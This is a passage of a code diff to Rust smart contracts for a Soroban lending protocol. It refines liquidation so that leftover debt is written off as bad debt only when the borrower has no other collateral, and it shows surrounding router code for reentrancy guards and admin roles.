+        let reserve_id_u8 = reserve_id as u8;
+
+        if reserve_id_u8 == collateral_reserve_id || !user_config.is_using_as_collateral(reserve_id_u8) {
+            continue;
+        }
+
+        let asset = storage::get_reserve_address_by_id(env, reserve_id)
+            .ok_or(KineticRouterError::ReserveNotFound)?;
+        if asset == *collateral_asset {
+            continue;
+        }
+
+        if let Some((collateral_balance, _)) = balance_cache.try_get(asset).ok().flatten() {
+            if collateral_balance > 0 {
+                return Ok(true);
+            }
+        }
+    }
+
+    Ok(false)
+}
+
 pub fn liquidation_call(
     env: Env,
     liquidator: Address,
     collateral_asset: Address,
     debt_asset: Address,
     user: Address,
     debt_to_cover: u128,
     _receive_a_token: bool,
 ) -> Result<(), KineticRouterError> {
     liquidator.require_auth();
 
     internal_liquidation_call(
         &env,
         liquidator,
         collateral_asset,
         debt_asset,
         user,
         debt_to_cover,
         _receive_a_token,
     )
 }
 
 fn internal_liquidation_call(
     env: &Env,
     liquidator: Address,
     collateral_asset: Address,
     debt_asset: Address,
     user: Address,
     debt_to_cover: u128,
     _receive_a_token: bool,
 ) -> Result<(), KineticRouterError> {
     validation::validate_liquidation_whitelist_access(env, &liquidator)?;
     validation::validate_liquidation_blacklist_access(env, &liquidator)?;
 
     // Get fresh prices for health factor calculation
     let (debt_price_data, collateral_price_data) =
         get_asset_prices_batch(env, &debt_asset, &collateral_asset)?;
     let debt_price = debt_price_data.price;
     let collateral_price = collateral_price_data.price;
 
     if collateral_price == 0 || debt_price == 0 {
         return Err(KineticRouterError::PriceOracleError);
     }
 
     // Fetch reserve data BEFORE calculating health factor to avoid duplicate reads
     let debt_reserve_data = storage::get_reserve_data(env, &debt_asset)?;
     let collateral_reserve_data = storage::get_reserve_data(env, &collateral_asset)?;
 
     // Update state at the beginning (consistent with supply/withdraw/borrow)
     let updated_debt_reserve_data =
         calculation::update_state(env, &debt_asset, &debt_reserve_data)?;
     let updated_collateral_reserve_data =
         calculation::update_state(env, &collateral_asset, &collateral_reserve_data)?;
 
     // Calculate health factor with fresh prices using unified function
     // Pass pre-fetched prices and updated reserve data to avoid duplicate reads
     let mut known_prices = Map::new(env);
     known_prices.set(collateral_asset.clone(), collateral_price);
     known_prices.set(debt_asset.clone(), debt_price);
     
     let mut known_reserves = Map::new(env);
     known_reserves.set(collateral_asset.clone(), updated_collateral_reserve_data.clone());
     known_reserves.set(debt_asset.clone(), updated_debt_reserve_data.clone());
     
     // NEW-03
     let oracle_config = crate::price::get_oracle_config(env)?;
     let oracle_to_wad = calculate_oracle_to_wad_factor(oracle_config.price_precision);
 
     let params = calculation::AccountDataParams {
         known_prices: Some(&known_prices),
         known_reserves: Some(&known_reserves),
         user_config: None,
         extra_assets: None,
         return_prices: false,
         known_balances: None,
     };
 
     let result = calculation::calculate_user_account_data_unified(env, &user, params)?;
     let user_account_data = result.account_data;
     let mut balance_cache = result.balance_cache;
 
     if user_account_data.health_factor >= WAD {
         return Err(KineticRouterError::InvalidLiquidation);
     }
 
     validation::validate_liquidation(
         env,
         &collateral_asset,
         &debt_asset,
         &user,
         debt_to_cover,
         Some(&updated_collateral_reserve_data),
         Some(&updated_debt_reserve_data),
     )?;
 
     let user_collateral_balance = balance_cache
         .try_get(collateral_asset.clone())
         .ok()
         .flatten()
         .map(|(coll, _)| coll)
         .ok_or(KineticRouterError::InsufficientCollateral)?;
 
     let debt_balance = {
         let (_, debt_u128) = balance_cache
             .try_get(debt_asset.clone())
             .ok()
             .flatten()
             .ok_or(KineticRouterError::NoDebtOfRequestedType)?;
         safe_u128_to_i128(env, debt_u128)
     };
 
     // Get decimals for close factor validation and protocol fee calculation
     let debt_decimals = updated_debt_reserve_data.configuration.get_decimals() as u32;
     let collateral_decimals = updated_collateral_reserve_data.configuration.get_decimals() as u32;
 
     let debt_decimals_pow = 10_u128
         .checked_pow(debt_decimals)
         .ok_or(KineticRouterError::MathOverflow)?;
     let collateral_decimals_pow = 10_u128
         .checked_pow(collateral_decimals)
         .ok_or(KineticRouterError::MathOverflow)?;
 
     // C-01 / WP-M2: Close factor validation
     let individual_debt_base = calculation::value_in_base(
         env, safe_i128_to_u128(env, debt_balance), debt_price, oracle_to_wad, debt_decimals_pow,
     )?;
     let individual_collateral_base = calculation::value_in_base(
         env, user_collateral_balance, collateral_price, oracle_to_wad, collateral_decimals_pow,
     )?;
     let debt_to_cover_base = calculation::value_in_base(
         env, debt_to_cover, debt_price, oracle_to_wad, debt_decimals_pow,
     )?;
     validate_close_factor(
         env, user_account_data.health_factor,
         individual_debt_base, individual_collateral_base, debt_to_cover_base,
     )?;
 
     let debt_to_cover = {
         let dtc_i128 = safe_u128_to_i128(env, debt_to_cover);
         let remaining = debt_balance
             .checked_sub(dtc_i128)
             .ok_or(KineticRouterError::MathOverflow)?;
         if remaining > 0 {
             let remaining_u128 = safe_i128_to_u128(env, remaining);
             let min_remaining_whole = updated_debt_reserve_data.configuration.get_min_remaining_debt();
             if min_remaining_whole > 0 {
                 let min_remaining_debt_val = (min_remaining_whole as u128)
                     .checked_mul(debt_decimals_pow)
                     .ok_or(KineticRouterError::MathOverflow)?;
                 if remaining_u128 < min_remaining_debt_val {
                     safe_i128_to_u128(env, debt_balance)
                 } else {
                     debt_to_cover
                 }
             } else {
                 debt_to_cover
             }
         } else {
             debt_to_cover
         }
     };
 
     // Calculate collateral to seize using the correct liquidation calculation function
     // This includes the liquidation bonus (e.g., 5%) and proper price conversions
     let (_collateral_amount, collateral_amount_to_transfer) =
         calculation::calculate_liquidation_amounts_with_reserves(
             env,
             &updated_collateral_reserve_data,
             &updated_debt_reserve_data,
             debt_to_cover,
             collateral_price,
             debt_price,
             oracle_to_wad,
         )?;
 
     // M-08
     // H-05
     let collateral_cap_triggered;
     let (debt_to_cover, collateral_amount_to_transfer) = if collateral_amount_to_transfer > user_collateral_balance {
         collateral_cap_triggered = true;
         // N-08
         // Formula: ceil(dtc * ucb / cat) = (dtc * ucb + cat - 1) / cat
         let adjusted_debt = {
             let dtc = U256::from_u128(&env, debt_to_cover);
             let ucb = U256::from_u128(&env, user_collateral_balance);
             let cat = U256::from_u128(&env, collateral_amount_to_transfer);
             let one = U256::from_u128(&env, 1u128);
             dtc.mul(&ucb).add(&cat).sub(&one).div(&cat)
                 .to_u128()
                 .ok_or(KineticRouterError::MathOverflow)?
         };
         (adjusted_debt, user_collateral_balance)
     } else {
         collateral_cap_triggered = false;
         (debt_to_cover, collateral_amount_to_transfer)
     };
 
     // Liquidator transfers debt asset directly to aToken contract
     // (Debt must be fully repaid to maintain proper aToken accounting)
     let mut liquidation_transfer_args = Vec::new(env);
     liquidation_transfer_args.push_back(IntoVal::into_val(&env.current_contract_address(), env));
     liquidation_transfer_args.push_back(liquidator.to_val());
     liquidation_transfer_args.push_back(updated_debt_reserve_data.a_token_address.to_val());
         liquidation_transfer_args.push_back(IntoVal::into_val(&safe_u128_to_i128(env, debt_to_cover), env));
 
     let transfer_result = env.try_invoke_contract::<(), KineticRouterError>(
         &debt_asset,
         &Symbol::new(env, "transfer_from"),
         liquidation_transfer_args,
     );
 
     match transfer_result {
         Ok(Ok(_)) => {}
         Ok(Err(_)) | Err(_) => {
             return Err(KineticRouterError::UnderlyingTransferFailed);
         }
     }
 
     // State already updated at the beginning, no need to update again
 
     // Burn debtToken
     let mut args = Vec::new(env);
     args.push_back(IntoVal::into_val(&env.current_contract_address(), env));
     args.push_back(user.to_val());
     args.push_back(IntoVal::into_val(&debt_to_cover, env));
     args.push_back(IntoVal::into_val(
         &updated_debt_reserve_data.variable_borrow_index,
         env,
     ));
 
     let debt_burn_result = env.try_invoke_contract::<(bool, i128, i128), KineticRouterError>(
         &updated_debt_reserve_data.debt_token_address,
         &Symbol::new(env, "burn_scaled"),
         args,
     );
 
     let mut debt_token_scaled_total: Option<u128> = None;
     match debt_burn_result {
         Ok(Ok((_is_zero, total_scaled, _user_remaining))) => {
             debt_token_scaled_total = Some(safe_i128_to_u128(env, total_scaled));
         }
         Ok(Err(_)) | Err(_) => {
             return Err(KineticRouterError::InsufficientCollateral)
         }
     }
 
     // Incentives are now handled directly in the token contract's burn_scaled function
 
     // Calculate protocol fee from liquidation premium.
     // Fee is taken from collateral bonus (not debt repayment) to maintain proper accounting.
     let protocol_fee_bps = storage::get_flash_loan_premium(env);
 
     let (protocol_fee_collateral, liquidator_collateral) = if protocol_fee_bps == 0 {
         (0u128, collateral_amount_to_transfer)
     } else {
         // M-07: Round UP to favor protocol
         let protocol_fee_debt = percent_mul_up(debt_to_cover, protocol_fee_bps)?;
 
         let protocol_fee_collateral = {
             let pfd = U256::from_u128(&env, protocol_fee_debt);
             let dp = U256::from_u128(&env, debt_price);
             let cdp = U256::from_u128(&env, collateral_decimals_pow);
             let cp = U256::from_u128(&env, collateral_price);
             let ddp = U256::from_u128(&env, debt_decimals_pow);
             pfd.mul(&dp).mul(&cdp).div(&cp).div(&ddp)
                 .to_u128()
                 .ok_or(KineticRouterError::MathOverflow)?
         };
 
         let liquidator_collateral = if collateral_amount_to_transfer > protocol_fee_collateral {
             collateral_amount_to_transfer.checked_sub(protocol_fee_collateral).ok_or(KineticRouterError::MathOverflow)?
         } else {
             return Err(KineticRouterError::MathOverflow);
         };
 
         (protocol_fee_collateral, liquidator_collateral)
     };
 
     let collateral_reserve_id = k2_shared::safe_reserve_id(env, updated_collateral_reserve_data.id);
     let mut a_token_scaled_total: Option<u128> = None;
 
     // MEDIUM-1: Track how much collateral was actually removed from the user's balance.
     // In the receive_a_token path, if no treasury is configured the fee stays with the borrower.
     let effective_collateral_removed;
 
     if _receive_a_token {
         // WP-M3: Transfer aTokens from borrower to liquidator (no underlying movement)
         let mut xfer_args = Vec::new(env);
         xfer_args.push_back(IntoVal::into_val(&env.current_contract_address(), env));
         xfer_args.push_back(user.to_val());
         xfer_args.push_back(liquidator.to_val());
         xfer_args.push_back(IntoVal::into_val(&liquidator_collateral, env));
         xfer_args.push_back(IntoVal::into_val(
             &updated_collateral_reserve_data.liquidity_index,
             env,
         ));
 
         let xfer_result = env.try_invoke_contract::<bool, KineticRouterError>(
             &updated_collateral_reserve_data.a_token_address,
             &Symbol::new(env, "transfer_on_liquidation"),
             xfer_args,
         );
 
         let is_first_balance = match xfer_result {
             Ok(Ok(is_first)) => is_first,
             Ok(Err(_)) | Err(_) => {
                 return Err(KineticRouterError::InsufficientCollateral)
             }
         };
 
         // Update liquidator UserConfiguration after receiving aTokens
         if is_first_balance {
             let mut liq_config = storage::get_user_configuration(env, &liquidator);
             if !liq_config.is_using_as_collateral(collateral_reserve_id) {
                 let active = liq_config.count_active_reserves();
                 if active >= storage::MAX_USER_RESERVES {
                     return Err(KineticRouterError::InvalidLiquidation);
                 }
                 liq_config.set_using_as_collateral(collateral_reserve_id, true);
                 storage::set_user_configuration(env, &liquidator, &liq_config);
             }
         }
 
         // WP-O7: Protocol fee collected as aTokens (not underlying) when receive_a_token=true.
         // Burning + transfer_underlying_to can fail if aToken holds insufficient underlying.
         // Instead, transfer aTokens from borrower to treasury (no underlying movement needed).
         // MEDIUM-1: Track whether fee was actually transferred away from borrower.
         let actually_transferred_fee = if protocol_fee_collateral > 0 {
             if let Some(treasury) = storage::get_treasury(env) {
                 let mut fee_xfer_args = Vec::new(env);
                 fee_xfer_args.push_back(IntoVal::into_val(&env.current_contract_address(), env));
                 fee_xfer_args.push_back(user.to_val());
                 fee_xfer_args.push_back(treasury.to_val());
                 fee_xfer_args.push_back(IntoVal::into_val(&protocol_fee_collateral, env));
                 fee_xfer_args.push_back(IntoVal::into_val(
                     &updated_collateral_reserve_data.liquidity_index,
                     env,
                 ));
 
                 let fee_xfer_result = env.try_invoke_contract::<bool, KineticRouterError>(
                     &updated_collateral_reserve_data.a_token_address,
                     &Symbol::new(env, "transfer_on_liquidation"),
                     fee_xfer_args,
                 );
 
                 match fee_xfer_result {
                     Ok(Ok(is_first_treasury)) => {
                         // LOW-1: Update treasury UserConfiguration if this is its first aToken balance
                         if is_first_treasury {
                             let mut treasury_config = storage::get_user_configuration(env, &treasury);
                             if !treasury_config.is_using_as_collateral(collateral_reserve_id) {
                                 let active = treasury_config.count_active_reserves();
                                 if active < storage::MAX_USER_RESERVES {
                                     treasury_config.set_using_as_collateral(collateral_reserve_id, true);
                                     storage::set_user_configuration(env, &treasury, &treasury_config);
                                 } else {
                                     // Emit monitoring event — treasury bitmap full
                                     env.events().publish(
                                         (symbol_short!("trs_skip"), treasury.clone()),
                                         collateral_reserve_id as u32,
                                     );
                                 }
                             }
                         }
                     }
                     Ok(Err(_)) | Err(_) => {
                         return Err(KineticRouterError::InsufficientCollateral)
                     }
                 }
                 protocol_fee_collateral
             } else {
                 // No treasury configured — fee stays with borrower
                 0u128
             }
         } else {
             0u128
         };
         // transfer_on_liquidation doesn't change total supply, so query it once
         // to avoid an extra cross-contract call in update_interest_rates_and_store.
         a_token_scaled_total = Some(calculation::get_scaled_total_supply(
             env,
             &updated_collateral_reserve_data.a_token_address,
         )?);
         effective_collateral_removed = liquidator_collateral
             .checked_add(actually_transferred_fee)
             .ok_or(KineticRouterError::MathOverflow)?;
     } else {
         // Original path: burn aTokens + transfer underlying to liquidator
         let mut burn_args = Vec::new(env);
         burn_args.push_back(IntoVal::into_val(&env.current_contract_address(), env));
         burn_args.push_back(user.to_val());
         burn_args.push_back(IntoVal::into_val(&collateral_amount_to_transfer, env));
         burn_args.push_back(IntoVal::into_val(
             &updated_collateral_reserve_data.liquidity_index,
             env,
         ));
 
         let burn_result = env.try_invoke_contract::<(bool, i128), KineticRouterError>(
             &updated_collateral_reserve_data.a_token_address,
             &Symbol::new(env, "burn_scaled"),
             burn_args,
         );
 
         match burn_result {
             Ok(Ok((_is_zero, total_scaled))) => {
                 a_token_scaled_total = Some(safe_i128_to_u128(env, total_scaled));
             }
             Ok(Err(_)) | Err(_) => {
                 return Err(KineticRouterError::InsufficientCollateral)
             }
         }
 
         // Transfer protocol fee to treasury if configured.
         if protocol_fee_collateral > 0 {
             if let Some(treasury) = storage::get_treasury(env) {
                 let mut fee_transfer_args = Vec::new(env);
                 fee_transfer_args.push_back(IntoVal::into_val(&env.current_contract_address(), env));
                 fee_transfer_args.push_back(treasury.to_val());
                 fee_transfer_args.push_back(IntoVal::into_val(&protocol_fee_collateral, env));
 
                 let fee_transfer_result = env.try_invoke_contract::<bool, KineticRouterError>(
                     &updated_collateral_reserve_data.a_token_address,
                     &Symbol::new(env, "transfer_underlying_to"),
                     fee_transfer_args,
                 );
 
                 match fee_transfer_result {
                     Ok(Ok(true)) => {}
                     Ok(Ok(false)) | Ok(Err(_)) | Err(_) => {
                         return Err(KineticRouterError::UnderlyingTransferFailed);
                     }
                 }
             }
         }
 
         // Transfer remaining collateral (with bonus minus protocol fee) to liquidator.
         let mut transfer_args = Vec::new(env);
         transfer_args.push_back(IntoVal::into_val(&env.current_contract_address(), env));
         transfer_args.push_back(liquidator.to_val());
         transfer_args.push_back(IntoVal::into_val(&liquidator_collateral, env));
 
         let transfer_result = env.try_invoke_contract::<bool, KineticRouterError>(
             &updated_collateral_reserve_data.a_token_address,
             &Symbol::new(env, "transfer_underlying_to"),
             transfer_args,
         );
 
         match transfer_result {
             Ok(Ok(true)) => {}
             Ok(Ok(false)) | Ok(Err(_)) | Err(_) => {
                 return Err(KineticRouterError::UnderlyingTransferFailed);
             }
         }
         // In burn path, full collateral_amount_to_transfer is always burned from user
         effective_collateral_removed = collateral_amount_to_transfer;
     }
 
     // MEDIUM-1: Use effective_collateral_removed instead of collateral_amount_to_transfer.
     // In receive_a_token path, if treasury is None the fee stays with borrower so
     // only liquidator_collateral was actually removed from the user's balance.
     let remaining_collateral_balance = user_collateral_balance
         .checked_sub(effective_collateral_removed)
         .ok_or(KineticRouterError::InsufficientCollateral)?;
     if remaining_collateral_balance == 0 {
         let mut user_config = storage::get_user_configuration(env, &user);
         user_config.set_using_as_collateral(collateral_reserve_id, false);
         storage::set_user_configuration(env, &user, &user_config);
     }
 
+    let no_other_collateral = if collateral_cap_triggered {
+        let user_config = storage::get_user_configuration(env, &user);
+        !user_has_other_collateral(
+            env,
+            &user_config,
+            &balance_cache,
+            &collateral_asset,
+            collateral_reserve_id,
+        )?
+    } else {
+        false
+    };
+
     let debt_to_cover_i128 = safe_u128_to_i128(env, debt_to_cover);
     let mut remaining_debt_balance = debt_balance
         .checked_sub(debt_to_cover_i128)
         .ok_or(KineticRouterError::MathOverflow)?;
     
     // H-02: Post-burn bad debt socialization.
-    // When collateral_cap_triggered, ALL remaining debt is unrecoverable (no collateral left
-    // for another liquidation). Socialize unconditionally — threshold is irrelevant here.
+    // Remaining debt is unrecoverable only when the liquidation exhausted the chosen
+    // collateral AND the user has no other collateral reserves with a positive balance.
     let min_remaining_whole = updated_debt_reserve_data.configuration.get_min_remaining_debt();
     if remaining_debt_balance > 0 {
         let remaining_debt_u128 = safe_i128_to_u128(env, remaining_debt_balance);
-        if collateral_cap_triggered {
-            // H-05: All collateral seized — remaining debt is unrecoverable bad debt.
+        if no_other_collateral {
             let mut bad_debt_burn_args = Vec::new(env);
             bad_debt_burn_args.push_back(IntoVal::into_val(&env.current_contract_address(), env));
             bad_debt_burn_args.push_back(user.to_val());
             bad_debt_burn_args.push_back(IntoVal::into_val(&remaining_debt_u128, env));
             bad_debt_burn_args.push_back(IntoVal::into_val(
                 &updated_debt_reserve_data.variable_borrow_index,
                 env,
             ));
 
             let bad_debt_burn_result = env.try_invoke_contract::<(bool, i128, i128), KineticRouterError>(
                 &updated_debt_reserve_data.debt_token_address,
                 &Symbol::new(env, "burn_scaled"),
                 bad_debt_burn_args,
             );
 
             match bad_debt_burn_result {
                 Ok(Ok((_is_zero, total_scaled, _user_remaining))) => {
                     // Use the LAST burn's return value (supersedes first burn)
                     debt_token_scaled_total = Some(safe_i128_to_u128(env, total_scaled));
                 }
                 Ok(Err(_)) | Err(_) => {
                     return Err(KineticRouterError::InsufficientCollateral);
                 }
             }
 
             // Track bad debt as deficit instead of socializing to depositors
             storage::add_reserve_deficit(env, &debt_asset, remaining_debt_u128);
 
             remaining_debt_balance = 0;
 
             // I-03: Structured deficit event with collateral context
             env.events().publish(
                 (symbol_short!("deficit"), symbol_short!("bad_debt")),
                 (user.clone(), collateral_asset.clone(), debt_asset.clone(), remaining_debt_u128, storage::get_reserve_deficit(env, &debt_asset)),
             );
         } else if min_remaining_whole > 0 {
             // Normal dust revert: match repay behavior (skip when min_remaining_whole == 0)
             let min_remaining_debt = (min_remaining_whole as u128)
                 .checked_mul(debt_decimals_pow)
                 .ok_or(KineticRouterError::MathOverflow)?;
             if remaining_debt_u128 < min_remaining_debt {
                 panic_with_error!(env, LiquidationError::LeavesTooLittleDebt);
             }
         }
     }
 
     // WP-L7: Check min leftover value for both debt and collateral
     // When partial liquidation leaves tiny remaining positions, they become
     // uneconomical to liquidate further. Revert to force full liquidation.
     if remaining_debt_balance > 0 && remaining_collateral_balance > 0 {
         let remaining_debt_u128_l7 = safe_i128_to_u128(env, remaining_debt_balance);
         let remaining_debt_value = {
             let rd = U256::from_u128(&env, remaining_debt_u128_l7);
             let dp = U256::from_u128(&env, debt_price);
             let otw = U256::from_u128(&env, oracle_to_wad);
             let ddp = U256::from_u128(&env, debt_decimals_pow);
             rd.mul(&dp).mul(&otw).div(&ddp)
                 .to_u128()
                 .ok_or(KineticRouterError::MathOverflow)?
         };
         let remaining_collateral_value = {
             let rc = U256::from_u128(&env, remaining_collateral_balance);
             let cp = U256::from_u128(&env, collateral_price);
             let otw = U256::from_u128(&env, oracle_to_wad);
             let cdp = U256::from_u128(&env, collateral_decimals_pow);
             rc.mul(&cp).mul(&otw).div(&cdp)
                 .to_u128()
                 .ok_or(KineticRouterError::MathOverflow)?
         };
         if remaining_debt_value < MIN_LEFTOVER_BASE || remaining_collateral_value < MIN_LEFTOVER_BASE {
             panic_with_error!(env, LiquidationError::LeavesTooLittleDebt);
         }
     }
 
     if remaining_debt_balance == 0 {
         let mut user_config = storage::get_user_configuration(env, &user);
         user_config.set_borrowing(k2_shared::safe_reserve_id(env, updated_debt_reserve_data.id), false);
         storage::set_user_configuration(env, &user, &user_config);
     }
 
     let post_burn_debt_reserve = storage::get_reserve_data(env, &debt_asset)?;
     let post_burn_collateral_reserve = storage::get_reserve_data(env, &collateral_asset)?;
     if collateral_asset == debt_asset {
         // Same asset: both a-token and debt-token totals known
         calculation::update_interest_rates_and_store(
             env, &debt_asset, &post_burn_debt_reserve,
             a_token_scaled_total, debt_token_scaled_total,
         )?;
     } else {
         // Debt reserve: debt_token total known from burn, a_token unknown
         calculation::update_interest_rates_and_store(
             env, &debt_asset, &post_burn_debt_reserve,
             None, debt_token_scaled_total,
         )?;
         // Collateral reserve: a_token total known from burn, debt_token unknown
         calculation::update_interest_rates_and_store(
             env, &collateral_asset, &post_burn_collateral_reserve,
             a_token_scaled_total, None,
         )?;
     }
 
     // Emit liquidation event with fee information.
     // LOW-2: Use effective_collateral_removed to derive the actual fee transferred,
     // not the computed protocol_fee_collateral (which may not have been transferred
     // if no treasury is configured in the receive_a_token path).
     let actual_protocol_fee = effective_collateral_removed
         .checked_sub(liquidator_collateral)
         .unwrap_or(0);
     env.events().publish(
         (symbol_short!("liquidate"), EV_EVENT),
         LiquidationCallEvent {
             collateral_asset,
             debt_asset,
             user,
             debt_to_cover,
             liquidated_collateral_amount: collateral_amount_to_transfer,
             liquidator,
             receive_a_token: _receive_a_token,
             protocol_fee: actual_protocol_fee,
             liquidator_collateral,
         },
     );
 
     Ok(())
 }
 

diff --git a/contracts/kinetic-router/src/router.rs b/contracts/kinetic-router/src/router.rs
--- a/contracts/kinetic-router/src/router.rs
+++ b/contracts/kinetic-router/src/router.rs
@@ -1,1890 +1,1896 @@
 use crate::{storage, validation};
 use k2_shared::*;
 use soroban_sdk::{contract, contractimpl, panic_with_error, symbol_short, Address, BytesN, Env, IntoVal, Symbol, U256, Vec};
 
 #[contract]
 pub struct KineticRouterContract;
 
 /// RAII reentrancy guard — automatically unlocks on drop (any return path).
 /// Fixes lock-leak bugs where early `return Err` paths skipped unlock.
 struct ReentrancyGuard<'a> {
     env: &'a Env,
 }
 
 impl<'a> Drop for ReentrancyGuard<'a> {
     fn drop(&mut self) {
         storage::set_protocol_locked(self.env, false);
     }
 }
 
 /// Acquire reentrancy guard: extends TTL, checks/sets lock, returns RAII guard.
 #[inline(never)]
 fn acquire_reentrancy_guard(env: &Env) -> ReentrancyGuard {
     storage::extend_instance_ttl(env);
     if storage::is_protocol_locked(env) {
         panic_with_error!(env, SecurityError::ReentrancyDetected);
     }
     storage::set_protocol_locked(env, true);
     ReentrancyGuard { env }
 }
 
 /// Generic two-step admin propose helper.
 fn propose_role_admin(
     env: &Env,
     caller: &Address,
     pending_admin: &Address,
     get_pending: fn(&Env) -> Result<Address, KineticRouterError>,
     set_pending: fn(&Env, &Address),
     cancel_topic: Symbol,
     propose_topic: Symbol,
 ) -> Result<(), KineticRouterError> {
     storage::validate_admin(env, caller)?;
     caller.require_auth();
 
     if let Ok(existing_pending) = get_pending(env) {
         use k2_shared::events::AdminProposalCancelledEvent;
         env.events().publish(
             (cancel_topic,),
             AdminProposalCancelledEvent {
                 admin: caller.clone(),
                 cancelled_pending_admin: existing_pending,
             },
         );
     }
 
     set_pending(env, pending_admin);
 
     use k2_shared::events::AdminProposedEvent;
     env.events().publish(
         (propose_topic,),
         AdminProposedEvent {
             current_admin: caller.clone(),
             pending_admin: pending_admin.clone(),
         },
     );
 
     Ok(())
 }
 
 /// Generic two-step admin accept helper.
 fn accept_role_admin(
     env: &Env,
     caller: &Address,
     pending: &Address,
     previous: &Address,
     set_admin: fn(&Env, &Address),
     clear_pending: fn(&Env),
     accept_topic: Symbol,
 ) -> Result<(), KineticRouterError> {
     if caller != pending {
         return Err(KineticRouterError::InvalidPendingAdmin);
     }
     caller.require_auth();
 
     set_admin(env, caller);
     clear_pending(env);
 
     use k2_shared::events::AdminAcceptedEvent;
     env.events().publish(
         (accept_topic,),
         AdminAcceptedEvent {
             previous_admin: previous.clone(),
             new_admin: caller.clone(),
         },
     );
 
     Ok(())
 }
 
 /// Generic two-step admin cancel helper.
 fn cancel_role_admin(
     env: &Env,
     caller: &Address,
     get_pending: fn(&Env) -> Result<Address, KineticRouterError>,
     clear_pending: fn(&Env),
     cancel_topic: Symbol,
 ) -> Result<(), KineticRouterError> {
     storage::validate_admin(env, caller)?;
     caller.require_auth();
 
     let cancelled_pending = get_pending(env)?;
     clear_pending(env);
 
     use k2_shared::events::AdminProposalCancelledEvent;
     env.events().publish(
         (cancel_topic,),
         AdminProposalCancelledEvent {
             admin: caller.clone(),
             cancelled_pending_admin: cancelled_pending,
         },
     );
 
     Ok(())
 }
 
 #[contractimpl]
 impl KineticRouterContract {
     /// Initialize the lending pool contract
     ///
     /// # Arguments
     /// * `env` - The Soroban environment
     /// * `pool_admin` - Address with pool admin privileges
     /// * `emergency_admin` - Address with emergency admin privileges
     /// * `price_oracle` - Address of the price oracle contract
     /// * `treasury` - Address of the treasury (receives protocol fees)
     /// * `dex_router` - Address of DEX router (Soroswap router)
     pub fn initialize(
         env: Env,
         pool_admin: Address,
         emergency_admin: Address,
         price_oracle: Address,
         treasury: Address,
         dex_router: Address,
         incentives_contract: Option<Address>,
     ) -> Result<(), KineticRouterError> {
         if storage::is_initialized(&env) {
             return Err(KineticRouterError::AlreadyInitialized);
         }
 
         pool_admin.require_auth();
 
         crate::upgrade::initialize_admin(&env, &pool_admin);
 
         storage::set_pool_admin(&env, &pool_admin);
         storage::set_emergency_admin(&env, &emergency_admin);
         storage::set_price_oracle(&env, &price_oracle);
         storage::set_treasury(&env, &treasury);
 
         // Initialize protocol parameters with safe defaults.
         // These can be adjusted by admin via setter functions if needed.
         storage::set_flash_loan_premium_max(&env, 100);
         storage::set_health_factor_liquidation_threshold(&env, 1_000_000_000_000_000_000);
         storage::set_min_swap_output_bps(&env, 9800);
         storage::set_partial_liquidation_hf_threshold(&env, 500_000_000_000_000_000);
         storage::set_dex_router(&env, &dex_router);
         if let Some(incentives) = incentives_contract {
             storage::set_incentives_contract(&env, &incentives);
         }
         storage::set_initialized(&env);
 
         Ok(())
     }
 
     /// Supply assets to the protocol
     ///
     /// # Arguments
     /// * `env` - The Soroban environment
     /// * `caller` - The address calling this function
     /// * `asset` - The address of the underlying asset to supply
     /// * `amount` - The amount to be supplied
     /// * `on_behalf_of` - The address that will receive the aTokens
     /// * `_referral_code` - Code used to register the integrator (unused for now)
     ///
     /// # Returns
     /// * `Ok(())` - Supply successful
     /// * `Err(KineticRouterError)` - Supply failed due to validation or cap limits
     ///
     /// # Cap Enforcement
     /// This function enforces supply caps if configured. Caps are stored as whole tokens
     /// and converted to smallest units during enforcement to maximize the effective range.
     pub fn supply(
         env: Env,
         caller: Address,
         asset: Address,
         amount: u128,
         on_behalf_of: Address,
         _referral_code: u32,
     ) -> Result<(), KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         crate::operations::supply(env.clone(), caller, asset, amount, on_behalf_of, _referral_code)
     }
 
     pub fn withdraw(
         env: Env,
         caller: Address,
         asset: Address,
         amount: u128,
         to: Address,
     ) -> Result<u128, KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         crate::operations::withdraw(env.clone(), caller, asset, amount, to)
     }
 
     pub fn swap_collateral(
         env: Env,
         caller: Address,
         from_asset: Address,
         to_asset: Address,
         amount: u128,
         min_amount_out: u128,
         swap_handler: Option<Address>,
     ) -> Result<u128, KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         crate::swap::swap_collateral(env.clone(), caller, from_asset, to_asset, amount, min_amount_out, swap_handler)
     }
 
     /// Set DEX router address (admin only)
     pub fn set_dex_router(env: Env, router: Address) -> Result<(), KineticRouterError> {
         let admin = storage::get_pool_admin(&env)?;
         admin.require_auth();
         storage::set_dex_router(&env, &router);
         // M-06
         env.events().publish(
             (symbol_short!("dex"), symbol_short!("router")),
             router,
         );
         Ok(())
     }
 
     /// Get DEX router address
     pub fn get_dex_router(env: Env) -> Option<Address> {
         storage::get_dex_router(&env)
     }
 
     /// Set DEX factory address (admin only)
     pub fn set_dex_factory(env: Env, factory: Address) -> Result<(), KineticRouterError> {
         let admin = storage::get_pool_admin(&env)?;
         admin.require_auth();
         storage::set_dex_factory(&env, &factory);
         // M-06: Emit event for off-chain indexers
         env.events().publish(
             (symbol_short!("dex"), symbol_short!("factory")),
             factory,
         );
         Ok(())
     }
 
     /// Get DEX factory address
     pub fn get_dex_factory(env: Env) -> Option<Address> {
         storage::get_dex_factory(&env)
     }
 
     pub fn borrow(
         env: Env,
         caller: Address,
         asset: Address,
         amount: u128,
         interest_rate_mode: u32,
         _referral_code: u32,
         on_behalf_of: Address,
     ) -> Result<(), KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         crate::operations::borrow(env.clone(), caller, asset, amount, interest_rate_mode, _referral_code, on_behalf_of)
     }
 
     pub fn repay(
         env: Env,
         caller: Address,
         asset: Address,
         amount: u128,
         rate_mode: u32,
         on_behalf_of: Address,
     ) -> Result<u128, KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         crate::operations::repay(env.clone(), caller, asset, amount, rate_mode, on_behalf_of)
     }
 
     /// Liquidate a position
     ///
     /// # Arguments
     /// * `collateral_asset` - The address of the underlying asset used as collateral
     /// * `debt_asset` - The address of the underlying borrowed asset to be repaid
     /// * `user` - The address of the borrower getting liquidated
     /// * `debt_to_cover` - The debt amount of borrowed asset to liquidate
     /// * `receive_a_token` - True if liquidator receives aTokens, false for underlying asset
     pub fn liquidation_call(
         env: Env,
         liquidator: Address,
         collateral_asset: Address,
         debt_asset: Address,
         user: Address,
